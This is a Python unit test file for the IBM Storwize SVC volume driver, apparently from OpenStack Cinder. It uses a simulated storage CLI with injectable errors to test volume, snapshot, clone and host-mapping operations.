            if kwargs['obj'] not in self._hosts_list:
                return self._errors['CMMVC5754E']
            host = self._hosts_list[kwargs['obj']]
            rows = []
            rows.append(['id', host['id']])
            rows.append(['name', host['host_name']])
            rows.append(['port_count', '1'])
            rows.append(['type', 'generic'])
            rows.append(['mask', '1111'])
            rows.append(['iogrp_count', '4'])
            rows.append(['status', 'online'])
            for port in host['iscsi_names']:
                rows.append(['iscsi_name', port])
                rows.append(['node_logged_in_count', '0'])
                rows.append(['state', 'offline'])
            for port in host['wwpns']:
                rows.append(['WWPN', port])
                rows.append(['node_logged_in_count', '0'])
                rows.append(['state', 'active'])

            if 'nohdr' in kwargs:
                for index in range(len(rows)):
                    rows[index] = ' '.join(rows[index][1:])

            if 'delim' in kwargs:
                for index in range(len(rows)):
                    rows[index] = kwargs['delim'].join(rows[index])

            return ('%s' % '\n'.join(rows), '')

    # List iSCSI authorization information about hosts
    def _cmd_lsiscsiauth(self, **kwargs):
        if self._next_cmd_error['lsiscsiauth'] == 'no_info':
            self._next_cmd_error['lsiscsiauth'] = ''
            return ('', '')
        rows = []
        rows.append(['type', 'id', 'name', 'iscsi_auth_method',
                     'iscsi_chap_secret'])

        for k, host in self._hosts_list.iteritems():
            method = 'none'
            secret = ''
            if 'chapsecret' in host:
                method = 'chap'
                secret = host['chapsecret']
            rows.append(['host', host['id'], host['host_name'], method,
                         secret])
        return self._print_info_cmd(rows=rows, **kwargs)

    # Create a vdisk-host mapping
    def _cmd_mkvdiskhostmap(self, **kwargs):
        mapping_info = {}
        mapping_info['id'] = self._find_unused_id(self._mappings_list)

        if 'host' not in kwargs:
            return self._errors['CMMVC5707E']
        mapping_info['host'] = kwargs['host'].strip('\'\'')

        if 'scsi' not in kwargs:
            return self._errors['CMMVC5707E']
        mapping_info['lun'] = kwargs['scsi'].strip('\'\'')

        if 'obj' not in kwargs:
            return self._errors['CMMVC5707E']
        mapping_info['vol'] = kwargs['obj'].strip('\'\'')

        if mapping_info['vol'] not in self._volumes_list:
            return self._errors['CMMVC5753E']

        if mapping_info['host'] not in self._hosts_list:
            return self._errors['CMMVC5754E']

        if mapping_info['vol'] in self._mappings_list:
            return self._errors['CMMVC6071E']

        for k, v in self._mappings_list.iteritems():
            if ((v['host'] == mapping_info['host']) and
                    (v['lun'] == mapping_info['lun'])):
                return self._errors['CMMVC5879E']

        for k, v in self._mappings_list.iteritems():
            if (v['lun'] == mapping_info['lun']) and ('force' not in kwargs):
                return self._errors['CMMVC6071E']

        self._mappings_list[mapping_info['id']] = mapping_info
        return ('Virtual Disk to Host map, id [%s], successfully created'
                % (mapping_info['id']), '')

    # Delete a vdisk-host mapping
    def _cmd_rmvdiskhostmap(self, **kwargs):
        if 'host' not in kwargs:
            return self._errors['CMMVC5707E']
        host = kwargs['host'].strip('\'\'')

        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        vol = kwargs['obj'].strip('\'\'')

        mapping_ids = []
        for k, v in self._mappings_list.iteritems():
            if v['vol'] == vol:
                mapping_ids.append(v['id'])
        if not mapping_ids:
            return self._errors['CMMVC5753E']

        this_mapping = None
        for mapping_id in mapping_ids:
            if self._mappings_list[mapping_id]['host'] == host:
                this_mapping = mapping_id
        if this_mapping == None:
            return self._errors['CMMVC5753E']

        del self._mappings_list[this_mapping]
        return ('', '')

    # List information about vdisk-host mappings
    def _cmd_lshostvdiskmap(self, **kwargs):
        index = 1
        no_hdr = 0
        delimeter = ''
        host_name = kwargs['obj']

        if host_name not in self._hosts_list:
            return self._errors['CMMVC5754E']

        rows = []
        rows.append(['id', 'name', 'SCSI_id', 'vdisk_id', 'vdisk_name',
                     'vdisk_UID'])

        for k, mapping in self._mappings_list.iteritems():
            if (host_name == '') or (mapping['host'] == host_name):
                volume = self._volumes_list[mapping['vol']]
                rows.append([mapping['id'], mapping['host'],
                            mapping['lun'], volume['id'],
                            volume['name'], volume['uid']])

        return self._print_info_cmd(rows=rows, **kwargs)

    # Create a FlashCopy mapping
    def _cmd_mkfcmap(self, **kwargs):
        source = ''
        target = ''
        copyrate = kwargs['copyrate'] if 'copyrate' in kwargs else '50'

        if 'source' not in kwargs:
            return self._errors['CMMVC5707E']
        source = kwargs['source'].strip('\'\'')
        if source not in self._volumes_list:
            return self._errors['CMMVC5754E']

        if 'target' not in kwargs:
            return self._errors['CMMVC5707E']
        target = kwargs['target'].strip('\'\'')
        if target not in self._volumes_list:
            return self._errors['CMMVC5754E']

        if source == target:
            return self._errors['CMMVC6303E']

        if (self._volumes_list[source]['capacity'] !=
                self._volumes_list[target]['capacity']):
            return self._errors['CMMVC5924E']

        fcmap_info = {}
        fcmap_info['source'] = source
        fcmap_info['target'] = target
        fcmap_info['id'] = self._find_unused_id(self._fcmappings_list)
        fcmap_info['name'] = 'fcmap' + fcmap_info['id']
        fcmap_info['copyrate'] = copyrate
        fcmap_info['progress'] = '0'
        fcmap_info['autodelete'] = True if 'autodelete' in kwargs else False
        fcmap_info['status'] = 'idle_or_copied'
        self._fcmappings_list[fcmap_info['id']] = fcmap_info

        return('FlashCopy Mapping, id [' + fcmap_info['id'] +
               '], successfully created', '')

    def _cmd_gen_prestartfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        id_num = kwargs['obj']

        if self._next_cmd_error['prestartfcmap'] == 'bad_id':
            id_num = -1
            self._next_cmd_error['prestartfcmap'] = ''

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        return self._state_transition('prepare', fcmap)

    def _cmd_gen_startfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        id_num = kwargs['obj']

        if self._next_cmd_error['startfcmap'] == 'bad_id':
            id_num = -1
            self._next_cmd_error['startfcmap'] = ''

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        return self._state_transition('start', fcmap)

    def _cmd_stopfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        id_num = kwargs['obj']

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        return self._state_transition('stop', fcmap)

    def _cmd_rmfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        id_num = kwargs['obj']
        force = True if 'force' in kwargs else False

        if self._next_cmd_error['rmfcmap'] == 'bad_id':
            id_num = -1
            self._next_cmd_error['rmfcmap'] = ''

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        function = 'delete_force' if force else 'delete'
        ret = self._state_transition(function, fcmap)
        if fcmap['status'] == 'end':
            del self._fcmappings_list[id_num]
        return ret

    def _cmd_lsvdiskfcmappings(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5707E']
        vdisk = kwargs['obj']
        rows = []
        rows.append(['id', 'name'])
        for k, v in self._fcmappings_list.iteritems():
            if v['source'] == vdisk or v['target'] == vdisk:
                rows.append([v['id'], v['name']])
        return self._print_info_cmd(rows=rows, **kwargs)

    def _cmd_chfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5707E']
        id_num = kwargs['obj']

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        for key in ['name', 'copyrate', 'autodelete']:
            if key in kwargs:
                fcmap[key] = kwargs[key]
        return ('', '')

    def _cmd_lsfcmap(self, **kwargs):
        rows = []
        rows.append(['id', 'name', 'source_vdisk_id', 'source_vdisk_name',
                     'target_vdisk_id', 'target_vdisk_name', 'group_id',
                     'group_name', 'status', 'progress', 'copy_rate',
                     'clean_progress', 'incremental', 'partner_FC_id',
                     'partner_FC_name', 'restoring', 'start_time',
                     'rc_controlled'])

        # Assume we always get a filtervalue argument
        filter_key = kwargs['filtervalue'].split('=')[0]
        filter_value = kwargs['filtervalue'].split('=')[1]
        to_delete = []
        for k, v in self._fcmappings_list.iteritems():
            if str(v[filter_key]) == filter_value:
                source = self._volumes_list[v['source']]
                target = self._volumes_list[v['target']]
                self._state_transition('wait', v)

                if self._next_cmd_error['lsfcmap'] == 'speed_up':
                    self._next_cmd_error['lsfcmap'] = ''
                    curr_state = v['status']
                    while self._state_transition('wait', v) == ("""", """"):
                        if curr_state == v['status']:
                            break
                        curr_state = v['status']

                if ((v['status'] == 'idle_or_copied' and v['autodelete'] and
                     v['progress'] == '100') or (v['status'] == 'end')):
                    to_delete.append(k)
                else:
                    rows.append([v['id'], v['name'], source['id'],
                                source['name'], target['id'], target['name'],
                                '', '', v['status'], v['progress'],
                                v['copyrate'], '100', 'off', '', '', 'no', '',
                                'no'])

        for d in to_delete:
            del self._fcmappings_list[k]

        return self._print_info_cmd(rows=rows, **kwargs)

    # Add host to list
    def _add_host_to_list(self, connector):
        host_info = {}
        host_info['id'] = self._find_unused_id(self._hosts_list)
        host_info['host_name'] = connector['host']
        host_info['iscsi_names'] = []
        host_info['wwpns'] = []
        if 'initiator' in connector:
            host_info['iscsi_names'].append(connector['initiator'])
        if 'wwpns' in connector:
            host_info['wwpns'] = host_info['wwpns'] + connector['wwpns']
        self._hosts_list[connector['host']] = host_info

    # The main function to run commands on the management simulator
    def execute_command(self, cmd, check_exit_code=True):
        try:
            kwargs = self._cmd_to_dict(cmd)
        except IndexError:
            return self._errors['CMMVC5707E']

        command = kwargs['cmd']
        del kwargs['cmd']

        if command == 'lsmdiskgrp':
            out, err = self._cmd_lsmdiskgrp(**kwargs)
        elif command == 'lslicense':
            out, err = self._cmd_lslicense(**kwargs)
        elif command == 'lssystem':
            out, err = self._cmd_lssystem(**kwargs)
        elif command == 'lsnodecanister':
            out, err = self._cmd_lsnodecanister(**kwargs)
        elif command == 'lsnode':
            out, err = self._cmd_lsnode(**kwargs)
        elif command == 'lsportip':
            out, err = self._cmd_lsportip(**kwargs)
        elif command == 'lsfabric':
            out, err = self._cmd_lsfabric(**kwargs)
        elif command == 'mkvdisk':
            out, err = self._cmd_mkvdisk(**kwargs)
        elif command == 'rmvdisk':
            out, err = self._cmd_rmvdisk(**kwargs)
        elif command == 'expandvdisksize':
            out, err = self._cmd_expandvdisksize(**kwargs)
        elif command == 'lsvdisk':
            out, err = self._cmd_lsvdisk(**kwargs)
        elif command == 'mkhost':
            out, err = self._cmd_mkhost(**kwargs)
        elif command == 'addhostport':
            out, err = self._cmd_addhostport(**kwargs)
        elif command == 'chhost':
            out, err = self._cmd_chhost(**kwargs)
        elif command == 'rmhost':
            out, err = self._cmd_rmhost(**kwargs)
        elif command == 'lshost':
            out, err = self._cmd_lshost(**kwargs)
        elif command == 'lsiscsiauth':
            out, err = self._cmd_lsiscsiauth(**kwargs)
        elif command == 'mkvdiskhostmap':
            out, err = self._cmd_mkvdiskhostmap(**kwargs)
        elif command == 'rmvdiskhostmap':
            out, err = self._cmd_rmvdiskhostmap(**kwargs)
        elif command == 'lshostvdiskmap':
            out, err = self._cmd_lshostvdiskmap(**kwargs)
        elif command == 'mkfcmap':
            out, err = self._cmd_mkfcmap(**kwargs)
        elif command == 'prestartfcmap':
            out, err = self._cmd_gen_prestartfcmap(**kwargs)
        elif command == 'startfcmap':
            out, err = self._cmd_gen_startfcmap(**kwargs)
        elif command == 'stopfcmap':
            out, err = self._cmd_stopfcmap(**kwargs)
        elif command == 'rmfcmap':
            out, err = self._cmd_rmfcmap(**kwargs)
        elif command == 'chfcmap':
            out, err = self._cmd_chfcmap(**kwargs)
        elif command == 'lsfcmap':
            out, err = self._cmd_lsfcmap(**kwargs)
        elif command == 'lsvdiskfcmappings':
            out, err = self._cmd_lsvdiskfcmappings(**kwargs)
        else:
            out, err = ('', 'ERROR: Unsupported command')

        if (check_exit_code) and (len(err) != 0):
            raise exception.ProcessExecutionError(exit_code=1,
                                                  stdout=out,
                                                  stderr=err,
                                                  cmd=' '.join(cmd))

        return (out, err)

    # After calling this function, the next call to the specified command will
    # result in in the error specified
    def error_injection(self, cmd, error):
        self._next_cmd_error[cmd] = error


class StorwizeSVCFakeDriver(storwize_svc.StorwizeSVCDriver):
    def __init__(self, *args, **kwargs):
        super(StorwizeSVCFakeDriver, self).__init__(*args, **kwargs)

    def set_fake_storage(self, fake):
        self.fake_storage = fake

    def _run_ssh(self, cmd, check_exit_code=True):
        try:
            LOG.debug(_('Run CLI command: %s') % cmd)
            ret = self.fake_storage.execute_command(cmd, check_exit_code)
            (stdout, stderr) = ret
            LOG.debug(_('CLI output:\n stdout: %(stdout)s\n stderr: '
                        '%(stderr)s') % {'stdout': stdout, 'stderr': stderr})

        except exception.ProcessExecutionError as e:
            with excutils.save_and_reraise_exception():
                LOG.debug(_('CLI Exception output:\n stdout: %(out)s\n '
                            'stderr: %(err)s') % {'out': e.stdout,
                                                  'err': e.stderr})

        return ret


class StorwizeSVCFakeSock:
    def settimeout(self, time):
        return


class StorwizeSVCDriverTestCase(test.TestCase):
    def setUp(self):
        super(StorwizeSVCDriverTestCase, self).setUp()
        self.USESIM = True
        if self.USESIM:
            self.driver = StorwizeSVCFakeDriver(
                configuration=conf.Configuration(None))
            self._def_flags = {'san_ip': 'hostname',
                               'san_login': 'user',
                               'san_password': 'pass',
                               'storwize_svc_flashcopy_timeout': 20,
                               # Test ignore capitalization
                               'storwize_svc_connection_protocol': 'iScSi',
                               'storwize_svc_multipath_enabled': False}
            wwpns = [str(random.randint(0, 9999999999999999)).zfill(16),
                     str(random.randint(0, 9999999999999999)).zfill(16)]
            initiator = 'test.initiator.%s' % str(random.randint(10000, 99999))
            self._connector = {'ip': '1.234.56.78',
                               'host': 'storwize-svc-test',
                               'wwpns': wwpns,
                               'initiator': initiator}
            self.sim = StorwizeSVCManagementSimulator('volpool')

            self.driver.set_fake_storage(self.sim)
        else:
            self.driver = storwize_svc.StorwizeSVCDriver(
                configuration=conf.Configuration(None))
            self._def_flags = {'san_ip': '1.111.11.11',
                               'san_login': 'user',
                               'san_password': 'password',
                               'storwize_svc_volpool_name': 'openstack',
                               # Test ignore capitalization
                               'storwize_svc_connection_protocol': 'iScSi',
                               'storwize_svc_multipath_enabled': False,
                               'ssh_conn_timeout': 0}
            config_group = self.driver.configuration.config_group
            self.driver.configuration.set_override('rootwrap_config',
                                                   '/etc/cinder/rootwrap.conf',
                                                   config_group)
            self._connector = connector.get_connector_properties()

        self._reset_flags()
        self.driver.db = StorwizeSVCFakeDB()
        self.driver.do_setup(None)
        self.driver.check_for_setup_error()
        self.stubs.Set(storwize_svc.time, 'sleep', lambda s: None)

    def _set_flag(self, flag, value):
        group = self.driver.configuration.config_group
        self.driver.configuration.set_override(flag, value, group)

    def _reset_flags(self):
        self.driver.configuration.local_conf.reset()
        for k, v in self._def_flags.iteritems():
            self._set_flag(k, v)

    def _assert_vol_exists(self, name, exists):
        is_vol_defined = self.driver._is_vdisk_defined(name)
        self.assertEqual(is_vol_defined, exists)

    def test_storwize_svc_connectivity(self):
        # Make sure we detect if the pool doesn't exist
        no_exist_pool = 'i-dont-exist-%s' % random.randint(10000, 99999)
        self._set_flag('storwize_svc_volpool_name', no_exist_pool)
        self.assertRaises(exception.InvalidInput,
                          self.driver.do_setup, None)
        self._reset_flags()

        # Check the case where the user didn't configure IP addresses
        # as well as receiving unexpected results from the storage
        if self.USESIM:
            self.sim.error_injection('lsnodecanister', 'header_mismatch')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.do_setup, None)
            self.sim.error_injection('lsnodecanister', 'remove_field')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.do_setup, None)
            self.sim.error_injection('lsportip', 'header_mismatch')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.do_setup, None)
            self.sim.error_injection('lsportip', 'remove_field')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.do_setup, None)

        # Check with bad parameters
        self._set_flag('san_ip', '')
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('san_password', None)
        self._set_flag('san_private_key', None)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_vol_rsize', 101)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_vol_warning', 101)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_vol_grainsize', 42)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_flashcopy_timeout', 601)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_vol_compression', True)
        self._set_flag('storwize_svc_vol_rsize', -1)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_connection_protocol', 'foo')
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_connection_protocol', 'iSCSI')
        self._set_flag('storwize_svc_multipath_enabled', True)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        if self.USESIM:
            self.sim.error_injection('lslicense', 'no_compression')
            self._set_flag('storwize_svc_vol_compression', True)
            self.driver.do_setup(None)
            self.assertRaises(exception.InvalidInput,
                              self.driver.check_for_setup_error)
            self._reset_flags()

        # Finally, check with good parameters
        self.driver.do_setup(None)

    def _generate_vol_info(self, vol_name, vol_id):
        rand_id = str(random.randint(10000, 99999))
        if vol_name:
            return {'name': 'snap_volume%s' % rand_id,
                    'volume_name': vol_name,
                    'id': rand_id,
                    'volume_id': vol_id,
                    'volume_size': 10}
        else:
            return {'name': 'test_volume%s' % rand_id,
                    'size': 10,
                    'id': '%s' % rand_id,
                    'volume_type_id': None}

    def _create_test_vol(self, opts):
        ctxt = context.get_admin_context()
        type_ref = volume_types.create(ctxt, 'testtype', opts)
        volume = self._generate_vol_info(None, None)
        volume['volume_type_id'] = type_ref['id']
        self.driver.create_volume(volume)

        attrs = self.driver._get_vdisk_attributes(volume['name'])
        self.driver.delete_volume(volume)
        volume_types.destroy(ctxt, type_ref['id'])
        return attrs

    def _fail_prepare_fc_map(self, fc_map_id, source, target):
        raise exception.ProcessExecutionError(exit_code=1,
                                              stdout='',
                                              stderr='unit-test-fail',
                                              cmd='prestartfcmap id')

    def test_storwize_svc_snapshots(self):
        vol1 = self._generate_vol_info(None, None)
        self.driver.create_volume(vol1)
        self.driver.db.volume_set(vol1)
        snap1 = self._generate_vol_info(vol1['name'], vol1['id'])

        # Test timeout and volume cleanup
        self._set_flag('storwize_svc_flashcopy_timeout', 1)
        self.assertRaises(exception.InvalidSnapshot,
                          self.driver.create_snapshot, snap1)
        self._assert_vol_exists(snap1['name'], False)
        self._reset_flags()

        # Test prestartfcmap, startfcmap, and rmfcmap failing
        orig = self.driver._call_prepare_fc_map
        self.driver._call_prepare_fc_map = self._fail_prepare_fc_map
        self.assertRaises(exception.ProcessExecutionError,
                          self.driver.create_snapshot, snap1)
        self.driver._call_prepare_fc_map = orig

        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
            self.sim.error_injection('startfcmap', 'bad_id')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_snapshot, snap1)
            self._assert_vol_exists(snap1['name'], False)
            self.sim.error_injection('prestartfcmap', 'bad_id')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_snapshot, snap1)
            self._assert_vol_exists(snap1['name'], False)

        # Test successful snapshot
        self.driver.create_snapshot(snap1)
        self._assert_vol_exists(snap1['name'], True)

        # Try to create a snapshot from an non-existing volume - should fail
        snap_novol = self._generate_vol_info('undefined-vol', '12345')
        self.assertRaises(exception.VolumeNotFound,
                          self.driver.create_snapshot,
                          snap_novol)

        # We support deleting a volume that has snapshots, so delete the volume
        # first
        self.driver.delete_volume(vol1)
        self.driver.delete_snapshot(snap1)

    def test_storwize_svc_create_volfromsnap_clone(self):
        vol1 = self._generate_vol_info(None, None)
        self.driver.create_volume(vol1)
        self.driver.db.volume_set(vol1)
        snap1 = self._generate_vol_info(vol1['name'], vol1['id'])
        self.driver.create_snapshot(snap1)
        vol2 = self._generate_vol_info(None, None)
        vol3 = self._generate_vol_info(None, None)

        # Try to create a volume from a non-existing snapshot
        snap_novol = self._generate_vol_info('undefined-vol', '12345')
        vol_novol = self._generate_vol_info(None, None)
        self.assertRaises(exception.SnapshotNotFound,
                          self.driver.create_volume_from_snapshot,
                          vol_novol,
                          snap_novol)

        # Fail the snapshot
        orig = self.driver._call_prepare_fc_map
        self.driver._call_prepare_fc_map = self._fail_prepare_fc_map
        self.assertRaises(exception.ProcessExecutionError,
                          self.driver.create_volume_from_snapshot,
                          vol2, snap1)
        self.driver._call_prepare_fc_map = orig
        self._assert_vol_exists(vol2['name'], False)

        # Try to create where source size != target size
        vol2['size'] += 1
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.create_volume_from_snapshot,
                          vol2, snap1)
        self._assert_vol_exists(vol2['name'], False)
        vol2['size'] -= 1

        # Succeed
        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_volume_from_snapshot(vol2, snap1)
        self._assert_vol_exists(vol2['name'], True)

        # Try to clone where source size != target size
        vol3['size'] += 1
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.create_cloned_volume,
                          vol3, vol2)
        self._assert_vol_exists(vol3['name'], False)
        vol3['size'] -= 1

        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_cloned_volume(vol3, vol2)
        self._assert_vol_exists(vol3['name'], True)

        # Delete in the 'opposite' order to make sure it works
        self.driver.delete_volume(vol3)
        self._assert_vol_exists(vol3['name'], False)
        self.driver.delete_volume(vol2)
        self._assert_vol_exists(vol2['name'], False)
        self.driver.delete_snapshot(snap1)
        self._assert_vol_exists(snap1['name'], False)
        self.driver.delete_volume(vol1)
        self._assert_vol_exists(vol1['name'], False)

    def test_storwize_svc_volumes(self):
        # Create a first volume
        volume = self._generate_vol_info(None, None)
        self.driver.create_volume(volume)

        self.driver.ensure_export(None, volume)

        # Do nothing
        self.driver.create_export(None, volume)
        self.driver.remove_export(None, volume)

        # Make sure volume attributes are as they should be
        attributes = self.driver._get_vdisk_attributes(volume['name'])
        attr_size = float(attributes['capacity']) / (1024 ** 3)  # bytes to GB
        self.assertEqual(attr_size, float(volume['size']))
        pool = self.driver.configuration.local_conf.storwize_svc_volpool_name
        self.assertEqual(attributes['mdisk_grp_name'], pool)

        # Try to create the volume again (should fail)
        self.assertRaises(exception.ProcessExecutionError,
                          self.driver.create_volume,
                          volume)

        # Try to delete a volume that doesn't exist (should not fail)
        vol_no_exist = {'name': 'i_dont_exist'}
        self.driver.delete_volume(vol_no_exist)
        # Ensure export for volume that doesn't exist (should not fail)
        self.driver.ensure_export(None, vol_no_exist)

        # Delete the volume
        self.driver.delete_volume(volume)

    def test_storwize_svc_volume_params(self):
        # Option test matrix
        # Option        Value   Covered by test #
        # rsize         -1      1
        # rsize         2       2,3
        # warning       0       2
        # warning       80      3
        # autoexpand    True    2
        # autoexpand    False   3
        # grainsize     32      2
        # grainsize     256     3
        # compression   True    4
        # compression   False   2,3
        # easytier      True    1,3
        # easytier      False   2

        opts_list = []
        chck_list = []
        opts_list.append({'rsize': -1, 'easytier': True})
        chck_list.append({'free_capacity': '0', 'easy_tier': 'on'})
        opts_list.append({'rsize': 2, 'compression': False, 'warning': 0,
                          'autoexpand': True, 'grainsize': 32,
                          'easytier': False})
        chck_list.append({'-free_capacity': '0', 'compressed_copy': 'no',
                          'warning': '0', 'autoexpand': 'on',
                          'grainsize': '32', 'easy_tier': 'off'})
        opts_list.append({'rsize': 2, 'compression': False, 'warning': 80,
                          'autoexpand': False, 'grainsize': 256,
                          'easytier': True})
        chck_list.append({'-free_capacity': '0', 'compressed_copy': 'no',
                          'warning': '80', 'autoexpand': 'off',
                          'grainsize': '256', 'easy_tier': 'on'})
        opts_list.append({'rsize': 2, 'compression': True})
        chck_list.append({'-free_capacity': '0',
                          'compressed_copy': 'yes'})

        for idx in range(len(opts_list)):
            attrs = self._create_test_vol(opts_list[idx])
            for k, v in chck_list[idx].iteritems():
                try:
                    if k[0] == '-':
                        k = k[1:]
                        self.assertNotEqual(attrs[k], v)
                    else:
                        self.assertEqual(attrs[k], v)
                except exception.ProcessExecutionError as e:
                    if 'CMMVC7050E' not in e.stderr:
                        raise

    def test_storwize_svc_unicode_host_and_volume_names(self):
        # We'll check with iSCSI only - nothing protocol-dependednt here
        self._set_flag('storwize_svc_connection_protocol', 'iSCSI')
        self.driver.do_setup(None)

        rand_id = random.randint(10000, 99999)
        volume1 = {'name': u'unicode1_volume%s' % rand_id,
                   'size': 2,
                   'id': 1,
                   'volume_type_id': None}
        self.driver.create_volume(volume1)
        self._assert_vol_exists(volume1['name'], True)

        self.assertRaises(exception.NoValidHost,
                          self.driver._connector_to_hostname_prefix,
                          {'host': 12345})

        # Add a a host first to make life interesting (this host and
        # conn['host'] should be translated to the same prefix, and the
        # initiator should differentiate
        tmpconn1 = {'initiator': u'unicode:initiator1.%s' % rand_id,
                    'ip': '10.10.10.10',
                    'host': u'unicode.foo}.bar{.baz-%s' % rand_id}
        self.driver._create_host(tmpconn1)

        # Add a host with a different prefix
        tmpconn2 = {'initiator': u'unicode:initiator2.%s' % rand_id,
                    'ip': '10.10.10.11',
                    'host': u'unicode.hello.world-%s' % rand_id}
        self.driver._create_host(tmpconn2)

        conn = {'initiator': u'unicode:initiator3.%s' % rand_id,
                'ip': '10.10.10.12',
                'host': u'unicode.foo}.bar}.baz-%s' % rand_id}
        self.driver.initialize_connection(volume1, conn)
        host_name = self.driver._get_host_from_connector(conn)
        self.assertNotEqual(host_name, None)
        self.driver.terminate_connection(volume1, conn)
        host_name = self.driver._get_host_from_connector(conn)
        self.assertEqual(host_name, None)
        self.driver.delete_volume(volume1)

        # Clean up temporary hosts
        for tmpconn in [tmpconn1, tmpconn2]:
            host_name = self.driver._get_host_from_connector(tmpconn)
            self.assertNotEqual(host_name, None)
            self.driver._delete_host(host_name)

    def test_storwize_svc_validate_connector(self):
        conn_neither = {'host': 'host'}
        conn_iscsi = {'host': 'host', 'initiator': 'foo'}
        conn_fc = {'host': 'host', 'wwpns': 'bar'}
        conn_both = {'host': 'host', 'initiator': 'foo', 'wwpns': 'bar'}

        self.driver._enabled_protocols = set(['iSCSI'])
        self.driver.validate_connector(conn_iscsi)
        self.driver.validate_connector(conn_both)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_fc)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_neither)

        self.driver._enabled_protocols = set(['FC'])
        self.driver.validate_connector(conn_fc)
        self.driver.validate_connector(conn_both)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_iscsi)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_neither)

        self.driver._enabled_protocols = set(['iSCSI', 'FC'])
        self.driver.validate_connector(conn_iscsi)
        self.driver.validate_connector(conn_fc)
        self.driver.validate_connector(conn_both)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_neither)

    def test_storwize_svc_host_maps(self):
        # Create two volumes to be used in mappings

        ctxt = context.get_admin_context()
        volume1 = self._generate_vol_info(None, None)
        self.driver.create_volume(volume1)
        volume2 = self._generate_vol_info(None, None)
        self.driver.create_volume(volume2)

        # Create volume types that we created
        types = {}
        for protocol in ['FC', 'iSCSI']:
            opts = {'storage_protocol': '<in> ' + protocol}
            types[protocol] = volume_types.create(ctxt, protocol, opts)

        for protocol in ['FC', 'iSCSI']:
            volume1['volume_type_id'] = types[protocol]['id']
            volume2['volume_type_id'] = types[protocol]['id']

            # Check case where no hosts exist
            if self.USESIM:
                ret = self.driver._get_host_from_connector(self._connector)
                self.assertEqual(ret, None)

            # Make sure that the volumes have been created
            self._assert_vol_exists(volume1['name'], True)
            self._assert_vol_exists(volume2['name'], True)

            # Initialize connection from the first volume to a host
            self.driver.initialize_connection(volume1, self._connector)

            # Initialize again, should notice it and do nothing
            self.driver.initialize_connection(volume1, self._connector)

            # Try to delete the 1st volume (should fail because it is mapped)
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.delete_volume,
                              volume1)

            # Check bad output from lsfabric for the 2nd volume
            if protocol == 'FC' and self.USESIM:
                for error in ['remove_field', 'header_mismatch']:
                    self.sim.error_injection('lsfabric', error)
                    self.assertRaises(exception.VolumeBackendAPIException,
                                      self.driver.initialize_connection,
                                      volume2, self._connector)

            self.driver.terminate_connection(volume1, self._connector)
            if self.USESIM:
                ret = self.driver._get_host_from_connector(self._connector)
                self.assertEqual(ret, None)

        # Check cases with no auth set for host
        if self.USESIM:
            for case in ['no_info', 'no_auth_set']:
                conn_na = {'initiator': 'test:init:%s' %
                                        random.randint(10000, 99999),
                           'ip': '11.11.11.11',
                           'host': 'host-%s' % case}
                self.sim._add_host_to_list(conn_na)
                volume1['volume_type_id'] = types['iSCSI']['id']
                if case == 'no_info':
                    self.sim.error_injection('lsiscsiauth', 'no_info')
                self.driver.initialize_connection(volume1, conn_na)
                ret = self.driver._get_chap_secret_for_host(conn_na['host'])
                self.assertNotEqual(ret, None)
                self.driver.terminate_connection(volume1, conn_na)

        # Test no preferred node
        if self.USESIM:
            self.sim.error_injection('lsvdisk', 'no_pref_node')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.initialize_connection,
                              volume1, self._connector)

